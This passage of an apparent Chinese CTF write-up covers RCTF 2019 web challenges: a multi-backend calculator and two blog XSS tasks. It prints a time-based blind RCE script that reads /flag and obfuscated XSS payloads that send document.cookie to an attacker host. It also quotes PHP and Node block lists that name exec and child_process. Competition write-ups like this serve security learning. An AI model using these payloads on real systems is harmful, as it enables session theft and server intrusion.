validationOptions,</span><br><span class="line">            validator: &#123;,</span><br><span class="line">                validate(value: any, args: ValidationArguments) &#123;</span><br><span class="line">                  const str = value ? value.toString() : &apos;&apos;;</span><br><span class="line">                  if (str.length === 0) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                  &#125;</span><br><span class="line">                  if (!(args.object as CalculateModel).isVip) &#123;</span><br><span class="line">                    if (str.length &gt;= args.constraints[0]) &#123;</span><br><span class="line">                      return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  if (!/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i.test(str)) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                  &#125;</span><br><span class="line">                  return true;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里限制了长度不得大于14，同时还进行了正则过滤</p>
+<p>不过这个长度限制我们可以通过<code>(args.object as CalculateModel).isVip</code>的值，也就是CalculateModel的isVip属性来绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public readonly isVip: boolean = false;</span><br></pre></td></tr></table></figure>
+<p>虽然这里默认为false，但我们可以通过post数据去修改isVip的值，这也是我想找出post值是怎么传到CalculateModel的原因<br>然后正则就看payload要怎么写再想怎么绕吧</p>
+<p>接着看看三个后端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import bson</span><br><span class="line">import json</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;, methods=[&quot;POST&quot;])</span><br><span class="line">def calculate():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line">    del __builtins__.exec</span><br><span class="line">    return bson.BSON.encode(&#123;</span><br><span class="line">        &quot;ret&quot;: str(eval(str(expr[&apos;expression&apos;])))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(&quot;0.0.0.0&quot;, 80)</span><br></pre></td></tr></table></figure>
+<p>python的可以看到是直接执行了，不过过滤了exec方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">$input = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$options = MongoDB\BSON\toPHP($input);</span><br><span class="line">$ret = eval(&apos;return &apos; . (string) $options-&gt;expression . &apos;;&apos;);</span><br><span class="line">echo MongoDB\BSON\fromPHP([&apos;ret&apos; =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure>
+<p>php源码本身没过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log</span><br><span class="line">max_execution_time = 1</span><br></pre></td></tr></table></figure>
+<p>但ini中过滤了system,exec,shell_exec这些方法，然后max_execution_time设置为了1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&apos;express&apos;)</span><br><span class="line">const bson = require(&apos;bson&apos;)</span><br><span class="line">const bodyParser = require(&apos;body-parser&apos;)</span><br><span class="line">const cluster = require(&apos;cluster&apos;)</span><br><span class="line">const app = express()</span><br><span class="line"></span><br><span class="line">if (cluster.isMaster) &#123;</span><br><span class="line">  app.use(bodyParser.raw(&#123; inflate: true, limit: &apos;10kb&apos;, type: &apos;*/*&apos; &#125;))</span><br><span class="line"></span><br><span class="line">  app.post(&apos;/&apos;, (req, res) =&gt; &#123;</span><br><span class="line">    const body = req.body</span><br><span class="line">    const data = bson.deserialize(Buffer.from(body))</span><br><span class="line">    const worker = cluster.fork()</span><br><span class="line">    worker.send(data.expression.toString())</span><br><span class="line">    worker.on(&apos;message&apos;, (ret) =&gt; &#123;</span><br><span class="line">      res.write(bson.serialize(&#123; ret: ret.toString() &#125;))</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;)</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      if (!worker.isDead()) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">          worker.kill()</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if (!res._headerSent) &#123;</span><br><span class="line">        res.write(bson.serialize(&#123; ret: &apos;timeout&apos; &#125;))</span><br><span class="line">        res.end()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  app.listen(80, () =&gt; &#123;</span><br><span class="line">    console.log(&apos;Server created&apos;)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">  (function () &#123;</span><br><span class="line">    const Module = require(&apos;module&apos;)</span><br><span class="line">    const _require = Module.prototype.require</span><br><span class="line">    Module.prototype.require = (arg) =&gt; &#123;</span><br><span class="line">      if ([&apos;os&apos;, &apos;child_process&apos;, &apos;vm&apos;, &apos;cluster&apos;].includes(arg)) &#123;</span><br><span class="line">        return null</span><br><span class="line">      &#125;</span><br><span class="line">      return _require.call(_require, arg)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">  </span><br><span class="line">  process.on(&apos;message&apos;, msg =&gt; &#123;</span><br><span class="line">    const ret = eval(msg)</span><br><span class="line">    process.send(ret)</span><br><span class="line">    process.exit(0)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Nodejs也是过滤了几个模块以及执行时长</p>
+<p>通过这几个源码我们可以知道，实际上我们的命令在后端是执行了，不过由于各个后端返回的结果不同于是报错获得不到想要的数据<br>于是尝试用curl但发现这几个后端都是在内网中的，不直接与公网连接，无法发送到我们的vps上。那就尝试一下时间盲注型的RCE<br>这里很神奇的是，虽然三个后端都有做执行时长限制，但测试会发现延时sleep(10)是可以成功的【不过我拿到的源码中是没有看到python有设置超时，也许是这个原因，但好像大佬们的wp中都有写python是设置了超时的</p>
+<p>于是用<code>list(range(10000000))</code>让python的执行时间延长</p>
+<p>结果延时成功</p>
+<p>然后就爆一波flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(10000000))</span><br></pre></td></tr></table></figure></p>
+<p>不过这里为了绕过正则要转为<code>chr()+chr()...</code>这样</p>
+<p>但是经过尝试会发现，实际上正确与不正确的时长好像差不多<br>这里看大佬的wp解释是可能是由于语法不正确导致nodejs崩溃，一直处于crash状态导致不响应，最终使得加载时间变长。那接下来就是要想办法去不让nodejs执行</p>
+<p>然后利用的是python的一个神奇的地方，如果是用<code>//</code>python也是会执行除法，而在nodejs和php中<code>//</code>我们知道是注释。于是我们就在payload前加个<code>1//1</code>，这样php和nodejs只会得到1而不执行后面的命令，防止了语法错误</p>
+<p>于是payload就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1//1 and (ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(10000000))</span><br></pre></td></tr></table></figure></p>
+<p>然后写波exp跑就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-  </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = r&apos;&apos;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">  &apos;Content-Type&apos;: &quot;application/json&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(32):</span><br><span class="line">	for j in range(127,0,-1):</span><br><span class="line">		s = &apos;&apos;</span><br><span class="line">		expression = &apos;1//1 and (ord(open(&quot;/flag&quot;).read()[&apos;+str(i)+&apos;])==&apos;+str(j)+&apos;) and set(1 for i in range(10000000))&apos;</span><br><span class="line">		for k in expression:</span><br><span class="line">			s = s + &apos;chr(&apos;+str(ord(k))+&apos;)+&apos;</span><br><span class="line">		expression = s[:-1]</span><br><span class="line">		payload = &apos;&#123;&quot;expression&quot;:&quot;&apos;+expression+&apos;&quot;,&quot;isVip&quot;:true&#125;&apos;</span><br><span class="line">		try:</span><br><span class="line">			requests.post(url,data=payload,headers=headers,timeout=0.5)</span><br><span class="line">		except:</span><br><span class="line">			flag = flag + chr(j)</span><br><span class="line">			print flag</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+<h2 id="rblog2019"><a href="#rblog2019" class="headerlink" title="rblog2019"></a>rblog2019</h2><p>这题没docker只能全靠wp脑补题目【手动笑哭</p>
+<p>进入是一个写有往年题wp的blog，查一下源码会发现引入了一个<code>rblog.js</code>。再读一下这个js会发现<code>/api/v2/posts</code>这个接口</p>
+<p>于是访问一下固定地返回了首页的那三篇文章，修改成/api/v2/json发送获得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;status&quot;: false, &quot;message&quot;: &quot;&apos;\/json&apos; not found.&quot;, &quot;data&quot;: [] &#125;</span><br></pre></td></tr></table></figure></p>
+<p>好像是个反射型xss的点，同时/被转义</p>
+<p>于是尝试一下<code>/api/v2/&lt;img&gt;</code>，然而什么都没发生，查了一下报文头发现<code>Content-Type: application/json</code>。那这里是xss不了了</p>
+<p>不过看着这个接口，既然是版本2，那是不是有版本1？于是尝试一下看看<code>/api/v2/posts</code>，再看看报文头，发现是<code>Content-Type: text/html; charset=UTF-8</code>。于是尝试<code>/api/v1/&lt;img&gt;</code>，这次就有解析了</p>
+<p>找到了XSS点，但依旧有三个限制，x-content-type-options和CSP以及chrome的XSS Auditor（题目里提示了Chrome 74）</p>
+<p>先说x-content-type-options，这个响应首部是用来控制浏览器内容嗅探行为。由于浏览器的内容嗅探行为，尽管返回内容的MIME类型与Content-Type 首部中对 MIME 类型不相同，但依旧会将类型转化成可执行的MIME类型。但若x-content-type-options设置了nosniff，那浏览器就不会进行内容嗅探，这样就可以遏止很多MIME的绕过，而nosniff也只是对script以及style起效（但实际上我在本地测试了很多次依旧没达到预期效果，是我的姿势不对？）<br>具体见：<a href="https://blog.csdn.net/TivonaLH/article/details/86310298" target="_blank" rel="noopener">web安全：x-content-type-options头设置</a></p>
+<p>本来是要通过外部加载js的，但由于设置了<code>x-content-type-options:nosniff</code>，我们就无法绕过<code>Content-Type: text/html; charset=UTF-8</code>。不过题目给了一个jsonp的提示，这个提示就是用来绕这里的</p>
+<p>我知道jsonp是用来解决跨域问题，但没去看过它真正是如何实现的</p>
+<p><a href="https://blog.csdn.net/u011897301/article/details/52679486" target="_blank" rel="noopener">简单透彻理解JSONP原理及使用</a></p>
+<p>简单来说，jsonp就是通过src这样调用远程js的方法来实现的，后台会将数据括入方法中，以js的格式返回（类似于这样：<code>return &#39;callback(&#39;.$data.&#39;)&#39;;）</code>，然后前端按照方法名进行回调。而一般情况下后台是不会知道前端实际上设置的方法名是什么，于是就出现了一个回调参数，常用是callback等等参数名。通过这个参数，后台即使不知道方法名是什么依旧可以让前端正常地进行回调<br>上面也说了返回是以js格式返回的，因此MIME的值为<code>application/javascript</code>，于是我们可以直接绕开x-content-type-options</p>
+<p>这里对posts接口测试一下，<code>/api/v2/posts?callback=test</code>，返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test(&#123;...&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>那看来是可以利用来执行js</p>
+<p>接着是CSP<br><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;</code><br>这个CSP好像作用不是很大，也就对我们要用的script的限制了不允许内联以及向获取外部资源</p>
+<p>到这里我们已经可以写出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://rblog.2019.rctf.rois.io/api/v1/posts?callback=parent.location.href=&apos;http://ip/?&apos;%2bdocument.cookie;console.log&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最后的console.log是用来充当回调，让语法正确</p>
+<p>但是经过测试会发现/以及’被转义了，不过也就这两个被转义，我们可以用html实体编码一下，然后用iframe的srcdoc属性执行</p>
+<p>于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&amp;#x3C;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x20;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3D;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x72;&amp;#x62;&amp;#x6C;&amp;#x6F;&amp;#x67;&amp;#x2E;&amp;#x32;&amp;#x30;&amp;#x31;&amp;#x39;&amp;#x2E;&amp;#x72;&amp;#x63;&amp;#x74;&amp;#x66;&amp;#x2E;&amp;#x72;&amp;#x6F;&amp;#x69;&amp;#x73;&amp;#x2E;&amp;#x69;&amp;#x6F;&amp;#x2F;&amp;#x61;&amp;#x70;&amp;#x69;&amp;#x2F;&amp;#x76;&amp;#x31;&amp;#x2F;&amp;#x70;&amp;#x6F;&amp;#x73;&amp;#x74;&amp;#x73;&amp;#x3F;&amp;#x63;&amp;#x61;&amp;#x6C;&amp;#x6C;&amp;#x62;&amp;#x61;&amp;#x63;&amp;#x6B;&amp;#x3D;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x2E;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x69;&amp;#x70;&amp;#x2F;&amp;#x3F;&amp;#x27;&amp;#x25;&amp;#x32;&amp;#x62;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6F;&amp;#x6B;&amp;#x69;&amp;#x65;&amp;#x3B;&amp;#x63;&amp;#x6F;&amp;#x6E;&amp;#x73;&amp;#x6F;&amp;#x6C;&amp;#x65;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x67;&amp;#x22;&amp;#x3E;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最后是XSS Auditor</p>
+<p>最简单的来说就是查找url中是否有标签，同时html是否也有相同的，相同则将可能产生xss的标签的属性值直接去掉。<br>比如像</p>
+<p><code>?xss=&lt;iframe%20srcdoc=。。。%27https://www.baidu.com%27&gt;</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/fc12c4d5ce09aa94cac0810e8791b882.png" alt=""></p>
+<p>后面的链接直接被去掉，至于更详细的可以看<br><a href="https://www.cnblogs.com/sevck/p/8868605.html" target="_blank" rel="noopener">Chrome和IE的xss过滤器分析总结</a></p>
+<p>那这里就要想办法让srcdoc中的值不非法。这里我们可以想，在后台是有进行过json编码的，而json编码对各种非英文字符都会直接转为unicode编码。我们可以利用这个特性，在url中传入中文，这样数据传到后台处理再返回回来后，显示在html中的就与url上的不同，这就成功绕过了XSS Auditor</p>
+<p>像这样</p>
+<p><code>?xss=&lt;iframe%20srcdoc=。。。%27https://www.baidu.com%27&gt;</code></p>
+<p>结果</p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/f63f7f702d11ef2b49decaa46e001ff4.png" alt=""></p>
+<p>于是payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v1/&lt;iframe srcdoc=。。。%26%23%78%33%43%3b%26%23%78%37%33%3b%26%23%78%36%33%3b%26%23%78%37%32%3b%26%23%78%36%39%3b%26%23%78%37%30%3b%26%23%78%37%34%3b%26%23%78%32%30%3b%26%23%78%37%33%3b%26%23%78%37%32%3b%26%23%78%36%33%3b%26%23%78%33%44%3b%26%23%78%32%32%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%37%33%3b%26%23%78%33%41%3b%26%23%78%32%46%3b%26%23%78%32%46%3b%26%23%78%37%32%3b%26%23%78%36%32%3b%26%23%78%36%43%3b%26%23%78%36%46%3b%26%23%78%36%37%3b%26%23%78%32%45%3b%26%23%78%33%32%3b%26%23%78%33%30%3b%26%23%78%33%31%3b%26%23%78%33%39%3b%26%23%78%32%45%3b%26%23%78%37%32%3b%26%23%78%36%33%3b%26%23%78%37%34%3b%26%23%78%36%36%3b%26%23%78%32%45%3b%26%23%78%37%32%3b%26%23%78%36%46%3b%26%23%78%36%39%3b%26%23%78%37%33%3b%26%23%78%32%45%3b%26%23%78%36%39%3b%26%23%78%36%46%3b%26%23%78%32%46%3b%26%23%78%36%31%3b%26%23%78%37%30%3b%26%23%78%36%39%3b%26%23%78%32%46%3b%26%23%78%37%36%3b%26%23%78%33%31%3b%26%23%78%32%46%3b%26%23%78%37%30%3b%26%23%78%36%46%3b%26%23%78%37%33%3b%26%23%78%37%34%3b%26%23%78%37%33%3b%26%23%78%33%46%3b%26%23%78%36%33%3b%26%23%78%36%31%3b%26%23%78%36%43%3b%26%23%78%36%43%3b%26%23%78%36%32%3b%26%23%78%36%31%3b%26%23%78%36%33%3b%26%23%78%36%42%3b%26%23%78%33%44%3b%26%23%78%37%30%3b%26%23%78%36%31%3b%26%23%78%37%32%3b%26%23%78%36%35%3b%26%23%78%36%45%3b%26%23%78%37%34%3b%26%23%78%32%45%3b%26%23%78%36%43%3b%26%23%78%36%46%3b%26%23%78%36%33%3b%26%23%78%36%31%3b%26%23%78%37%34%3b%26%23%78%36%39%3b%26%23%78%36%46%3b%26%23%78%36%45%3b%26%23%78%32%45%3b%26%23%78%36%38%3b%26%23%78%37%32%3b%26%23%78%36%35%3b%26%23%78%36%36%3b%26%23%78%33%44%3b%26%23%78%32%37%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%33%41%3b%26%23%78%32%46%3b%26%23%78%32%46%3b%26%23%78%36%39%3b%26%23%78%37%30%3b%26%23%78%32%46%3b%26%23%78%33%46%3b%26%23%78%32%37%3b%26%23%78%32%35%3b%26%23%78%33%32%3b%26%23%78%36%32%3b%26%23%78%36%34%3b%26%23%78%36%46%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%44%3b%26%23%78%36%35%3b%26%23%78%36%45%3b%26%23%78%37%34%3b%26%23%78%32%45%3b%26%23%78%36%33%3b%26%23%78%36%46%3b%26%23%78%36%46%3b%26%23%78%36%42%3b%26%23%78%36%39%3b%26%23%78%36%35%3b%26%23%78%33%42%3b%26%23%78%36%33%3b%26%23%78%36%46%3b%26%23%78%36%45%3b%26%23%78%37%33%3b%26%23%78%36%46%3b%26%23%78%36%43%3b%26%23%78%36%35%3b%26%23%78%32%45%3b%26%23%78%36%43%3b%26%23%78%36%46%3b%26%23%78%36%37%3b%26%23%78%32%32%3b%26%23%78%33%45%3b%26%23%78%33%43%3b%26%23%78%32%46%3b%26%23%78%37%33%3b%26%23%78%36%33%3b%26%23%78%37%32%3b%26%23%78%36%39%3b%26%23%78%37%30%3b%26%23%78%37%34%3b%26%23%78%33%45%3b&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="ez4cr"><a href="#ez4cr" class="headerlink" title="ez4cr"></a>ez4cr</h2><p>这题与上题同环境，进入上题的管理员后台就是这题<br>还有上题的cookie返回了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint_for_rBlog_2019.2=the flag for rblog2019.2 is in the cookie of the report domain. You may need a chrome xss auditor bypass ._.</span><br></pre></td></tr></table></figure>
+<p>这就是说我们又要打一次cookie</p>
+<p>与上题同样，我们要找一个能返回text/html的接口，F12会在js中发现一个report.php的接口，于是抓下包发现是text/html页面</p>
+<p>然后再尝试一个callback也成功返回了<code>test({...})</code>，CSP也和上题是一样的，同时并没有对/和’进行转义，那就比上题更简单了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=parent.location.href=&apos;http://ip/?&apos;%2bdocument.cookie;console.log</span><br></pre></td></tr></table></figure>
+<p>用这个返回js页面，然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=&lt;script src=&quot;https://report-rblog.2019.rctf.rois.io/report.php?callback=parent.location.href=&apos;http://ip/?&apos;%2bdocument.cookie;console.log&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>引入执行</p>
+<p>不过这里还是有个XSS Auditor的过滤，和上题不同，这题我们并没有数据会在后台被进行json编码，那就不能和上题一样用同样的方法绕过</p>
+<p>这题的绕过方式看wp的大佬们都是经过漫长的fuzz才整出来的，这里在script的src中如果使用http，在经过后端处理后会整成https，这样返回的内容就和url的不同了，真是tql</p>
+<p>于是payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=&lt;script src=&quot;http://report-rblog.2019.rctf.rois.io/report.php?callback=parent.location.href=&apos;http://ip/?&apos;%2bdocument.cookie;console.log&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里会由http升为https是由于Cloudflare CDN 配置不妥所导致，配置CDN还是要小心点。不过这两题如果在cookie中设置了HttpOnly属性那也没XSS的事了2333333</p>
+<p>不过好像CDN并不是预期解，看大佬们都没找出来，那这题的预期解到底是什么orz</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/21/ciscn2019-web-wp/" rel="next" title="ciscn2019 web 复现">
+                <i class="fa fa-chevron-left"></i> ciscn2019 web 复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/07/RSA/" rel="prev" title="神奇的RSA">
+                神奇的RSA <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
